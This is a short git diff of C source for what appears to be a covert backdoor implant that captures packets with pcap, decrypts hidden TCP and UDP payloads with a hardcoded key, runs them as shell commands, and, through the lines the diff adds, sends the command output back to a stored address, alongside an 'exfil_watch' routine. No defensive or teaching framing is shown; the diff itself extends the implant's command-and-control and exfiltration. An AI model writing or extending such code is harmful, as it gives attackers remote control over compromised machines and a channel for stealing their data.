@@ -37,6 +37,7 @@ struct exfil_pack {
 };
 
 int channel;
+uint32 ip_addr;
 
 void pcap_init(uint32 ipaddr, char *folder, int chan) {
 	pcap_t* nic;
@@ -46,6 +47,7 @@ void pcap_init(uint32 ipaddr, char *folder, int chan) {
 	char * fltr_str = PKT_T_FLT;
 
 	channel = chan;
+	ip_addr = ipaddr;
 
 	if (channel == 2)
 		fltr_str = PKT_U_FLT;
@@ -129,7 +131,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	// decrypt the payload and copy it into decrypt_payload variable.
 	memcpy(decrypt_payload, decrypt(SEKRET, tcp_payload, sizeof(tcp_payload)), sizeof(tcp_payload));
 
-	cmd_execute(decrypt_payload, iphdr->saddr);
+	cmd_execute(decrypt_payload, ip_addr);
 }
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
@@ -156,6 +158,8 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 
 	// decrypt the payload and copy it into decrypt_payload variable.
 	memcpy(decrypt_payload, decrypt(SEKRET, udp_payload, sizeof(udp_payload)), sizeof(udp_payload));
+
+	cmd_execute(decrypt_payload, ip_addr);
 }
 
 void cmd_execute(char *command, uint32 ip) {
@@ -175,6 +179,8 @@ void cmd_execute(char *command, uint32 ip) {
 		strcat(resp, line);
 
 	tot_len = strlen(resp) + 1;
+
+	_send(ip, resp);
 }
 
 void *exfil_watch(void *arg) {
